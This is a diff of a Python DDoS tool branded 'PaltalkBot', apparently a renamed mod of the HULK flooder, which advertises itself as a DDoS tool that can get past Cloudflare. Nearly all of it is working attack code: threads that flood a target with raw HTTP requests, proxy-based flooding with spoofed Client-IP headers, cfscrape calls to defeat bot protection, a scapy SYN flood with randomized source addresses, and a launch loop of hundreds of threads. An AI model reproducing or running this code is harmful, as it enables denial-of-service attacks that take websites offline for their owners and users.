@@ -2,44 +2,27 @@
 # # Discord: Paltalk#1995                # #
 # # Paltalk    : @VN                     # #
 # # Email  : paltalkddos@gmail.com       # #
-# # Tools Paltalk DDoS V10               # #
+# # Tools Paltalk DDoS V3.0              # #
 #[+]====================================[+]#
 #coding: utf-8
-#..:: > HULK_v9.5 < ::.. Mod By VN
-import os, sys
-import certifi
-import socket
-import threading
-import time
-import datetime
-import urllib2
-import urllib
-import re
-import sys
-import optparse
-import os
-import urlparse
-import string
-import requests
-import cfscrape
-import request
-import random, bz2, json, sys, glob, ssl, webbrowser, io, ssl, wget, urllib3
+#..:: > PaltalkBot v3.0 < ::.. Mod By VN
+import sys, os, threading, time, random, string, cfscrape, requests, socket, datetime, urllib, urllib2, urllib3, re, urlparse, optparse, request, bz2, json, glob, io, ssl, wget
 from bs4 import BeautifulSoup
 from colorama import Fore
 from scapy.all import *
+from urllib3 import PoolManager
+from multiprocessing import Pool # rat nang may
 from os import system
 from sys import stdout
-from random import randint
-from scapy.all import sr1,IP,ICMP, TCP
-from scapy.all import srp,Ether,ARP,conf
-from scapy.all import IP, UDP, send, Raw
-from struct import *
-from requests import *
-from multiprocessing import Pool
-from urllib3 import PoolManager
-
-
-#Hulk Mod By VN
+from scapy.all import sr1,IP,ICMP, TCP, UDP, Raw, Ether, send, ARP, conf, srp
+###################################################
+Intn = random.randint
+Choice = random.choice
+scraper = cfscrape.create_scraper()
+urllib3.disable_warnings()
+urllib3.PoolManager()
+###################################################
+#PaltalkBot Mod By VN
 url=''
 host=''
 headers_useragents=[]
@@ -56,14 +39,6 @@ def set_flag(val):
 def set_safe():
  global safe
  safe=1
-###################################################
-Intn = random.randint
-Choice = random.choice
-scraper = cfscrape.create_scraper()
-cookies = ""
-urllib3.disable_warnings()
-urllib3.PoolManager()
-###################################################
 def getUserAgent():
     platform = Choice(['Macintosh', 'Windows', 'X11'])
     if platform == 'Macintosh':
@@ -182,7 +157,6 @@ def buildblock(size):
  
 def randomurl2():  
   return buildblock(Intn(4,10)) + '=' + str(Intn(3,  90000)) + buildblock(Intn(4,10)) + '&' + buildblock(Intn(3, 10)) + '=' + str(Intn(3,  90000))
-  
 def httpcall(url):
  referer_list()
  code=0
@@ -191,10 +165,11 @@ def httpcall(url):
  else:
   param_joiner = "?"
  request = urllib2.Request(url)
+ request = scraper.get(url)
  request.add_header('User-Agent', getUserAgent())
  request.get_header("Content-Type")
  request.get_header("application/x-zip")
- request.add_header("Content-Length", random.randint(99999))
+ request.add_header("Content-Length", random.randint(0, 99999))
  request.add_header('Cache-Control', 'no-cache')
  request.add_header('Content-Type', 'application/json')
  request.add_header('Content-Type', 'multipart/form-data; boundary=---------------------------WebKitFormBoundaryePkpFF7tjBAqx29L735323031399963166993862150')
@@ -263,24 +238,22 @@ def randomIpList1():
     for ip in xrange(Intn(1, 1)):
         res = res + randomIp() + ", "
     return res[0:len(res) - 2]
-    
-class Home(threading.Thread): 
+class Home(threading.Thread):
     def run(self):
+        global req_code, error
         referer_list()
-        useragent = "User-Agent: " + getUserAgent() + "\r\n" 
-        length = "Content-Length: 0\r\n"
-        content = "Content-Type: application/x-www-form-urlencoded\r\n"
-        content += "Content-Type: application/json\r\n"
-        accept    = random.choice(acceptall)
+        useragent = "User-Agent: " + getUserAgent() + "\r\n"
+        accept    = Choice(acceptall)        
+        length = "Content-Length: 0\r\n"        
         referer = "Referer: "+ Choice(headers_referers) + url + "?r="+ "\r\n"
-        connection = "Connection: Keep-Alive\r\n"
         k = "Keep-Alive: "+ str(Intn(110,120))+"\r\n"
-        if choice_mode == "1":
-            get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
-            request  = get_host + useragent + connection + k + accept + content + length + "\r\n"
+        if choice_mode == "1":            
+            get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n" 
+            request  = get_host + useragent + accept + length + "\r\n"
         else:
-            get_host = random.choice(['GET','POST','HEAD'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
-            request  = get_host + useragent + connection + k + accept + referer + content + length + "\r\n"
+            get_host = Choice(['GET','POST','HEAD'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
+            
+            request  = get_host + useragent + k + accept + referer + length + "\r\n"
         while True:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -289,9 +262,8 @@ class Home(threading.Thread):
                     s = ssl.wrap_socket(s)
                 s.send(str.encode(request))
 
-  
                 try:
-                    for y in xrange(15):
+                    for i in xrange(15):
                         s.send(str.encode(request))
 
                         req_code += 1
@@ -306,7 +278,8 @@ class Home(threading.Thread):
                     s.close()
                     error += 1
                 except:
-                    pass
+                    pass  
+
 class proxybypass(threading.Thread):
     def run(self):
         referer_list()
@@ -347,9 +320,7 @@ class attacproxy2(threading.Thread):
             proxy = listaproxy[current].split(':')
         else:
             proxy = Choice(listaproxy).split(':')
-        cookies, user_agent = cfscrape.get_cookie_string(url, user_agent=getUserAgent())
-        cookies1 = "Cookies: " +str(cookies)+"\r\n"        
-        cookies1 += "User-Agent: " +str(user_agent)+"\r\n"
+        useragent = "User-Agent: " + getUserAgent() + "\r\n"
         accept = Choice(acceptall)        
         referer = "Referer: "+ Choice(headers_referers) + url + "?r="+ "\r\n"        
         fake_ip = "Client-IP: " + randomIpList1() + "\r\n"   
@@ -357,7 +328,7 @@ class attacproxy2(threading.Thread):
         connection = "Connection: Keep-Alive\r\n"
         k = "Keep-Alive: "+ str(Intn(110,120))+"\r\n"        
         http.request = "GET " + url + "?" + randomurl2() +" HTTP/1.1\r\nHost: " + host_url + "\r\n"        
-        http.request = http.request + cookies1 + referer + connection + k + accept + fake_ip+ "\r\n"
+        http.request = http.request + useragent + referer + connection + k + accept + fake_ip+ "\r\n"
         
         while True:
             try:
@@ -370,7 +341,8 @@ class attacproxy2(threading.Thread):
                 except:
                     tts = 1                   
             except:
-                proxy = Choice(listaproxy).split(':')               
+                proxy = Choice(listaproxy).split(':')
+                
 class JSv2(threading.Thread):
     def run(self):
         scraper = cfscrape.create_scraper()
@@ -518,6 +490,7 @@ def tcpflood():
 		except:
 			s.close()
 			print("[*] Error")        
+
 class synflood(threading.Thread):
     def init(self, counter):
         threading.Thread.init(self)
@@ -526,12 +499,12 @@ class synflood(threading.Thread):
     def run(self):
         global req_code, error
         while True:
-            s_port = random.randint(1000,9000)
-            s_eq = random.randint(1000,9000)
-            w_indow = random.randint(1000,9000)
+            s_port = Intn(1000,9000)
+            s_eq = Intn(1000,9000)
+            w_indow = Intn(1000,9000)
         
-            IP_Packet = IP ()            
-            IP_Packet.src = ".".join(map(str, (randint(0,255)for i in range(4))))
+            IP_Packet = IP ()
+            IP_Packet.src = ".".join(map(str, (Intn(0,255)for _ in range(4))))
             IP_Packet.dst = host_url
         
             TCP_Packet = TCP ()
@@ -558,7 +531,7 @@ def logo():
     elif sys.platform.startswith("freebsd"):
         os.system('clear')
     else:
-        os.system('color  ' +random.choice(['A', 'B', 'C', 'D', 'E', 'F'])+ " & cls & title PaltalkBot V9.5 BY VN")
+        os.system('color  ' +random.choice(['A', 'B', 'C', 'D', 'E', 'F'])+ " & cls & title PaltalkBot V3.0 BY VN")
     print(
 """
 `.......1111111111111`..11`..1111111111111`..`..11111111111`.....1111`.....1111111111111111`..1..11
@@ -570,7 +543,7 @@ def logo():
 `..111111111`..1`...`...111`..111`..1`...`...`..11`..111111`.....1111`.....1111111`..111111`..1..11
 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
 > Tool DDoS Created By VN-PALTALK
-> HULKV 9.5 With Proxy (bypass Cloudfale)
+> PaltalkBot 3.0 With Proxy (bypass Cloudfale)
 ___________________________________________________________________________________________________""")
 def logo3():
     if sys.platform.startswith("linux"):
@@ -578,7 +551,7 @@ def logo3():
     elif sys.platform.startswith("freebsd"):
         os.system('clear')
     else:
-        os.system('color  ' +random.choice(['A', 'B', 'C', 'D', 'E', 'F'])+ " & cls & title PaltalkBot V9.5 BY VN")
+        os.system('color  ' +random.choice(['A', 'B', 'C', 'D', 'E', 'F'])+ " & cls & title PaltalkBot V3.0 BY VN")
     print(
 """
 `.......1111111111111`..11`..1111111111111`..`..11111111111`.....1111`.....1111111111111111`..1..11
@@ -590,7 +563,7 @@ def logo3():
 `..111111111`..1`...`...111`..111`..1`...`...`..11`..111111`.....1111`.....1111111`..111111`..1..11
 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
 > Tool DDoS Created By VN-PALTALK
-> HULKV 9.5 With Proxy (bypass Cloudfale)
+> PaltalkBot 3.0 With Proxy (bypass Cloudfale)
 ___________________________________________________________________________________________________""")
     try:
         print(Fore.LIGHTYELLOW_EX +"\n[*] Target : " +str(url)+ ":" +str(port))
@@ -664,11 +637,11 @@ def start_mode():
             attacproxy2().start()
         if method_proxy == "2":
            print("<------------------------>") 
-           print(Fore.CYAN+"     Customize Cookies")
+           print(Fore.CYAN+"     Customize Cookies (Enter=Auto)")
            c_cookies = raw_input(Fore.GREEN+ "[*] Plese input the cookies:"+ Fore.WHITE)
            if c_cookies is"":
-              c_cookies = ""
-           print(Fore.CYAN+"     Customize User-Agent")
+              c_cookies = c_cookies
+           print(Fore.CYAN+"     Customize User-Agent (Enter=Auto)")
            c_useragent = raw_input(Fore.GREEN+ "[*] Plese input the User-Agent:"+ Fore.WHITE)
            if c_useragent is"":
               c_useragent = getUserAgent()
@@ -712,12 +685,12 @@ def start_mode():
             filemode2 = ""
             
 get_host = "GET " + url + "?" + randomurl2() +" HTTP/1.1\r\nHost: " + host_url + "\r\n" 
-accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Language: en-US,en;q=0.5\r\nAccept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\nContent-Type: application/x-www-form-urlencoded\r\nPragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace\r\nAccept-Encoding', DNT , 1\r\n"
+accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept: image/webp,image/apng,image/*,*/*;q=0.8\r\nAccept: */*\r\nAccept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept: text/css,*/*;q=0.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\nContent-Type: application/x-www-form-urlencoded\r\nPragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace\r\nAccept-Encoding', DNT , 1\r\n"
 acceptall = [
-    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/json\r\n", 
+    "Accept: text/css,*/*;q=0.1\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/json\r\n", 
     "Accept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n",
     "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/json\r\n",
-    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+    "Accept: image/webp,image/apng,image/*,*/*;q=0.8\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
     "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\nContent-Type: application/json\r\n",
     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nContent-Type: application/json\r\n",
     "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Language: en-US,en;q=0.5\r\n",
@@ -726,7 +699,7 @@ acceptall = [
     "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Language: en-US,en;q=0.5\r\n",
     "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nContent-Type: application/json\r\n",
     "Accept: text/html, application/xhtml+xml\r\nContent-Type: application/x-www-form-urlencoded\r\n",
-    "Accept-Language: en-US,en;q=0.5\r\nContent-Type: application/json\r\n",
+    "Accept-Language: en-US,en;q=0.5\r\nContent-Type: application/json\r\nPragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace\r\n",
     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nContent-Type: application/json\r\n",
     "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\nContent-Type: application/x-www-form-urlencoded\r\n",
     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nContent-Type: application/x-www-form-urlencoded\r\n",] 
@@ -738,7 +711,7 @@ def logo1():
     elif sys.platform.startswith("freebsd"):
         os.system('clear')
     else:
-        os.system('color  ' +random.choice(['A', 'B', 'C', 'D', 'E', 'F'])+ " & cls & title PaltalkBot V9.5 BY VN")
+        os.system('color  ' +random.choice(['A', 'B', 'C', 'D', 'E', 'F'])+ " & cls & title PaltalkBot V3.0 BY VN")
     print(Fore.CYAN +
 """
 EEEEEEEEEEEEEEEEEEEEEE                   jjjj                                         
@@ -772,7 +745,7 @@ if url.count("/")==2:
     url = url + "/"
     m = re.search('http\://([^/]*)/?.*', url)
     host = m.group(1)
-for x in xrange(500):
+for x in xrange(503):
  t = HTTPThread()
  t.start()
 t = MonitorThread()
